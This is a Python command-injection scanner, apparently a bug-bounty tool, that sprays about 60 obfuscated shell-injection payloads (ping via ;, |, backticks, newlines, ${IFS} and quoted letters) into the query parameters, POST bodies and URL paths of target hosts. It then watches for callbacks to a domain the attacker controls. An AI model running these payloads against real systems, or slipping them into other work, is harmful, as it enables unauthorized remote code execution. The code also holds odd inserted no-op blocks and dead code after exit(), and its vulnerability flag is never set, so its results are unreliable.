import os
import sys
import re
import time
import copy
import random
import argparse
import requests
import urllib.parse
from functools import partial
from threading import Thread
from queue import Queue
from multiprocessing.dummy import Pool
from colored import fg, bg, attr
MAX_EXCEPTION = 100
MAX_VULNERABLE = 100
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def banner():
    if False:
        while True:
            i = 10
    print("\n                     _ __    ___    ___       _ __    _   _\n                    | '__|  / __|  / _ \\     | '_ \\  | | | |\n                    | |    | (__  |  __/  _  | |_) | | |_| |\n                    |_|     \\___|  \\___| (_) | .__/   \\__, |\n                                             |_|      |___/\n\n            by @gwendallecoguic\n\n")
    pass

def rebuiltQuery(t_params):
    if False:
        while True:
            i = 10
    query = ''
    for (pname, t_values) in t_params.items():
        for k in range(len(t_values)):
            query = query + pname + '=' + t_values[k] + '&'
    return query.strip('&')

def _parse_qs(query):
    if False:
        return 10
    t_params = {}
    tmptab = query.split('&')
    for param in tmptab:
        t_param = param.split('=')
        pname = t_param[0]
        if not pname in t_params:
            t_params[pname] = []
        pvalue = '' if len(t_param) < 2 else t_param[1]
        t_params[pname].append(pvalue)
    return t_params

def testParams(t_urlparse, payload):
    if False:
        print('Hello World!')
    t_params = _parse_qs(t_urlparse.query)
    for (pname, t_values) in t_params.items():
        for k in range(len(t_values)):
            pvalue = t_values[k]
            t_params2 = copy.deepcopy(t_params)
            if pvalue == '':
                pvalue = 666
            new_value = str(pvalue) + payload
            t_params2[pname][k] = new_value
            new_query = rebuiltQuery(t_params2)
            t_urlparse = t_urlparse._replace(query=new_query)
            url = urllib.parse.urlunparse(t_urlparse)
            doTest(url)
            t_urlparse = t_urlparse._replace(query='')
            url = urllib.parse.urlunparse(t_urlparse)
            doTest(url, 'POST', t_params2)

def testFragment(t_urlparse, payload):
    if False:
        while True:
            i = 10
    new_value = t_urlparse.fragment + payload
    t_urlparse = t_urlparse._replace(fragment=new_value)
    url = urllib.parse.urlunparse(t_urlparse)
    doTest(url)

def testPath(t_urlparse, payload):
    if False:
        i = 10
        return i + 15
    path = ''
    t_path = ['/'] + t_urlparse.path.split('/')
    for dir in t_path:
        if len(dir):
            path = path + '/' + dir
            path = path.replace('//', '/')
            new_value = path + '/' + payload
            new_value = new_value.replace('//', '/')
            t_urlparse = t_urlparse._replace(path=new_value)
            url = urllib.parse.urlunparse(t_urlparse)
            doTest(url)

def testPayload(url, payload):
    if False:
        print('Hello World!')
    payload = payload.replace('___RANDOM_STR__', str(int(random.random() * 10000)))
    t_urlparse = urllib.parse.urlparse(url)
    if len(t_urlparse.query):
        testParams(t_urlparse, payload.strip('/'))
    testPath(t_urlparse, payload)

def testURL(url):
    if False:
        while True:
            i = 10
    time.sleep(0.01)
    t_multiproc['n_current'] = t_multiproc['n_current'] + 1
    if _verbose <= 1:
        sys.stdout.write('progress: %d/%d\r' % (t_multiproc['n_current'], t_multiproc['n_total']))
    pool = Pool(10)
    pool.map(partial(testPayload, url), t_payloads)
    pool.close()
    pool.join()

def doTest(url, method='GET', post_params=''):
    if False:
        print('Hello World!')
    realDoTest([url, method, post_params])
    return

def realDoTest(t_params):
    if False:
        for i in range(10):
            print('nop')
    url = t_params[0]
    method = t_params[1]
    post_params = t_params[2]
    if _verbose <= 1:
        sys.stdout.write('progress: %d/%d\r' % (t_multiproc['n_current'], t_multiproc['n_total']))
    t_urlparse = urllib.parse.urlparse(url)
    u = t_urlparse.scheme + '_' + t_urlparse.netloc
    try:
        if method == 'POST':
            r = requests.post(url, data=post_params, headers=t_custom_headers, timeout=5, verify=False)
        else:
            r = requests.head(url, headers=t_custom_headers, timeout=5, verify=False)
    except Exception as e:
        if _verbose >= 3 and _verbose < 4:
            sys.stdout.write('%s[-] error occurred: %s%s\n' % (fg('red'), e, attr(0)))
        return
    if 'Content-Type' in r.headers:
        content_type = r.headers['Content-Type']
    else:
        content_type = '-'
    vuln = '-'
    output = '%s\t\tC=%d\t\tT=%s\t\tV=%s\n' % (url, r.status_code, content_type, vuln)
    fp = open(t_multiproc['f_output'], 'a+')
    fp.write(output)
    fp.close()
    if vuln == 'VULNERABLE' or (_verbose >= 2 and _verbose < 4):
        if vuln == 'VULNERABLE':
            sys.stdout.write('%s%s%s' % (fg('light_red'), output, attr(0)))
        else:
            sys.stdout.write(output)
parser = argparse.ArgumentParser()
parser.add_argument('-a', '--path', help='set paths list')
parser.add_argument('-d', '--header', help='custom headers, example: cookie1=value1;cookie2=value2...', action='append')
parser.add_argument('-m', '--domain', help='your domain to call')
parser.add_argument('-p', '--payloads', help='set payloads list')
parser.add_argument('-o', '--hosts', help='set host list (required or -u)')
parser.add_argument('-s', '--scheme', help='scheme to use, default=http,https')
parser.add_argument('-t', '--threads', help='threads, default 10')
parser.add_argument('-u', '--urls', help='set url list (required or -o)')
parser.add_argument('-v', '--verbose', help='display output, 0=nothing, 1=only vulnerable, 2=all requests, 3=full debug, 4=only vulnerable,no extra text like banner, default: 1')
parser.parse_args()
args = parser.parse_args()
if args.verbose:
    _verbose = int(args.verbose)
else:
    _verbose = 1
if _verbose < 4:
    banner()
if args.scheme:
    t_scheme = args.scheme.split(',')
else:
    t_scheme = ['http', 'https']
if args.domain:
    domain = args.domain
else:
    parser.error('destinaton domain not configured')
t_custom_headers = {}
if args.header:
    for header in args.header:
        if ':' in header:
            tmp = header.split(':')
            t_custom_headers[tmp[0].strip()] = tmp[1].strip()
t_hosts = []
if args.hosts:
    if os.path.isfile(args.hosts):
        fp = open(args.hosts, 'r')
        t_hosts = fp.read().strip().split('\n')
        fp.close()
    else:
        t_hosts.append(args.hosts)
n_hosts = len(t_hosts)
if _verbose < 4:
    sys.stdout.write('%s[+] %d hosts found: %s%s\n' % (fg('green'), n_hosts, args.hosts, attr(0)))
t_urls = []
if args.urls:
    if os.path.isfile(args.urls):
        fp = open(args.urls, 'r')
        t_urls = fp.read().strip().split('\n')
        fp.close()
    else:
        t_urls.append(args.urls)
else:
    while True:
        try:
            url = input()
        except EOFError:
            break
        else:
            t_urls.append(url)
n_urls = len(t_urls)
if _verbose < 4:
    sys.stdout.write('%s[+] %d urls found: %s%s\n' % (fg('green'), n_urls, args.urls, attr(0)))
if n_hosts == 0 and n_urls == 0:
    parser.error('hosts/urls list missing')
t_path = ['']
if args.path:
    if os.path.isfile(args.path):
        fp = open(args.path, 'r')
        t_path = fp.read().strip().split('\n')
        fp.close()
    else:
        t_path.append(args.path)
n_path = len(t_path)
if _verbose < 4:
    sys.stdout.write('%s[+] %d path found: %s%s\n' % (fg('green'), n_path, args.path, attr(0)))
if args.payloads:
    t_payloads = []
    if os.path.isfile(args.payloads):
        fp = open(args.payloads, 'r')
        t_payloads = fp.read().strip().split('\n')
        fp.close()
    else:
        t_payloads.append(args.payloads)
    n_payloads = len(t_payloads)
    if _verbose < 4:
        sys.stdout.write('%s[+] %d payloads found: %s%s\n' % (fg('green'), n_payloads, args.payloads, attr(0)))
else:
    n_payloads = 0
if args.threads:
    _threads = int(args.threads)
else:
    _threads = 10
t_totest = []
u_max_length = 0
d_output = os.getcwd() + '/rce'
f_output = d_output + '/' + 'output'
if not os.path.isdir(d_output):
    try:
        os.makedirs(d_output)
    except Exception as e:
        sys.stdout.write('%s[-] error occurred: %s%s\n' % (fg('red'), e, attr(0)))
        exit()
if _verbose < 4:
    sys.stdout.write('%s[+] options are -> threads:%d, verbose:%d%s\n' % (fg('green'), _threads, _verbose, attr(0)))
    sys.stdout.write('[+] computing host and payload list...\n')
if not n_payloads:
    t_payloads = ['rce___RANDOM_STR__.__DOMAIN__', '$;ping%20rce___RANDOM_STR__.__DOMAIN__', '%0Aping%20rce___RANDOM_STR__.__DOMAIN__%0A', '%0Aping%20rce___RANDOM_STR__.__DOMAIN__', '%0a%20ping%20rce___RANDOM_STR__.__DOMAIN__%20%0a', '%0aping%20rce___RANDOM_STR__.__DOMAIN__%0a', '%26%20ping%20rce___RANDOM_STR__.__DOMAIN__%20%26', '%26%26%20ping%20rce___RANDOM_STR__.__DOMAIN__%20%26%26', '&%20ping%20rce___RANDOM_STR__.__DOMAIN__', ');ping${IFS}rce___RANDOM_STR__.__DOMAIN__', ');ping<rce___RANDOM_STR__.__DOMAIN__', ");p'i'n'g'${IFS}rce___RANDOM_STR__.__DOMAIN__%23", ');p"i"n"g%20rce___RANDOM_STR__.__DOMAIN__%23', ');{p\\i\n\\g,rce___RANDOM_STR__.__DOMAIN__}%23', ');{ping,rce___RANDOM_STR__.__DOMAIN__}', ');ping%20rce___RANDOM_STR__.__DOMAIN__', ');ping%20rce___RANDOM_STR__.__DOMAIN__;', ');ping%20rce___RANDOM_STR__.__DOMAIN__|', ')|ping%20rce___RANDOM_STR__.__DOMAIN__', ')|ping%20rce___RANDOM_STR__.__DOMAIN__;', ';{ping;rce___RANDOM_STR__.__DOMAIN__}', ";exec('ping%20rce___RANDOM_STR__.__DOMAIN__')", ';ping${IFS}rce___RANDOM_STR__.__DOMAIN__;', ';ping<rce___RANDOM_STR__.__DOMAIN__;', ';p\\i\n\\g%20rce___RANDOM_STR__.__DOMAIN__;', ';{ping,rce___RANDOM_STR__.__DOMAIN__};', ';ping%20rce___RANDOM_STR__.__DOMAIN__', ';ping%20rce___RANDOM_STR__.__DOMAIN__;', ";p'i'\x1bn'g%20rce___RANDOM_STR__.__DOMAIN__;", ';p"i"\x1bn"g%20rce___RANDOM_STR__.__DOMAIN__;', ';p\\i\\\x1bn\\g%20rce___RANDOM_STR__.__DOMAIN__;', ';p$@in$@g%20rce___RANDOM_STR__.__DOMAIN__;', ';p$()in$()g%20rce___RANDOM_STR__.__DOMAIN__;', ';ping%20rce___RANDOM_STR__.__DOMAIN__\n', ';ping%20rce___RANDOM_STR__.__DOMAIN__|', ";system('ping%20rce___RANDOM_STR__.__DOMAIN__')", ';|ping%20rce___RANDOM_STR__.__DOMAIN__|', '\nping%20rce___RANDOM_STR__.__DOMAIN__;', '\nping%20rce___RANDOM_STR__.__DOMAIN__\n', '\nping%20rce___RANDOM_STR__.__DOMAIN__|', '`ping%20rce___RANDOM_STR__.__DOMAIN__`', '|%20ping%20rce___RANDOM_STR__.__DOMAIN__', '|\nping%20rce___RANDOM_STR__.__DOMAIN__\n', '|ping%20rce___RANDOM_STR__.__DOMAIN__', '|ping${IFS}rce___RANDOM_STR__.__DOMAIN__;', '|ping<rce___RANDOM_STR__.__DOMAIN__;', '|{ping,rce___RANDOM_STR__.__DOMAIN__};', '|ping%20rce___RANDOM_STR__.__DOMAIN__;', '|ping%20rce___RANDOM_STR__.__DOMAIN__\n', '|ping%20rce___RANDOM_STR__.__DOMAIN__|', '||ping$IFSrce___RANDOM_STR__.__DOMAIN__;', '||ping<rce___RANDOM_STR__.__DOMAIN__;', '||{ping,rce___RANDOM_STR__.__DOMAIN__};', '||ping%20rce___RANDOM_STR__.__DOMAIN__;', '||ping%20rce___RANDOM_STR__.__DOMAIN__|', "||p'i'\x1bn'g%20rce___RANDOM_STR__.__DOMAIN__%23", '||p"i"\x1bn"g%20rce___RANDOM_STR__.__DOMAIN__%23', '||p\\i\\\x1bn\\g%20rce___RANDOM_STR__.__DOMAIN__%23', '||p$@in$@g%20rce___RANDOM_STR__.__DOMAIN__%23', '||p$()in$()g%20rce___RANDOM_STR__.__DOMAIN__%23']
for (i, payload) in enumerate(t_payloads):
    t_payloads[i] = payload.replace('__DOMAIN__', domain)
for scheme in t_scheme:
    for host in t_hosts:
        for path in t_path:
            u = scheme + '://' + host.strip() + path
            t_totest.append(u)
            l = len(u)
            if l > u_max_length:
                u_max_length = l
for url in t_urls:
    for path in t_path:
        u = url.strip() + path
        t_totest.append(u)
        l = len(u)
        if l > u_max_length:
            u_max_length = l
n_totest = len(t_totest)
if _verbose < 4:
    sys.stdout.write('%s[+] %d urls created.%s\n' % (fg('green'), n_totest, attr(0)))
    sys.stdout.write('[+] testing...\n')
t_realdotest = []
t_exceptions = {}
t_vulnerable = {}
t_multiproc = {'n_current': 0, 'n_total': n_totest, 'u_max_length': u_max_length + 5, 'd_output': d_output, 'f_output': f_output}

def doWork():
    if False:
        i = 10
        return i + 15
    while True:
        url = q.get()
        testURL(url)
        q.task_done()
q = Queue(_threads * 2)
for i in range(_threads):
    t = Thread(target=doWork)
    t.daemon = True
    t.start()
try:
    for url in t_totest:
        q.put(url)
    q.join()
except KeyboardInterrupt:
    sys.exit(1)
exit()
t_exceptions = {}
t_vulnerable = {}
t_multiproc = {'n_current': 0, 'n_total': len(t_realdotest), 'u_max_length': u_max_length + 5, 'd_output': d_output, 'f_output': f_output}

def realDoWork():
    if False:
        return 10
    while True:
        params = q.get()
        realDoTest(params)
        q.task_done()
q = Queue(_threads * 2)
for i in range(_threads):
    t = Thread(target=realDoWork)
    t.daemon = True
    t.start()
try:
    for url in t_realdotest:
        q.put(url)
    q.join()
except KeyboardInterrupt:
    sys.exit(1)